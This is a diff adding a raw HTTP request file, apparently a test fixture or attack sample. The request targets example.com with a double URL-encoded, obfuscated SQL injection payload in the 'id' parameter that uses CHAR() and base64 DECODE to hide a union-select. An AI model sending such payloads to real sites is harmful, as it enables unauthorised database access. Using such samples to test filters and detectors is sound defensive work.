@@ -1,0 +1,6 @@
+GET /index.php?id=%27%252520CHAR%2879%2C114%29%252520DEcOde%28%27dW5pb24GC2VsZWN0IDESmiwz%27%2C%252520%27BAsE64%27%29-- HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
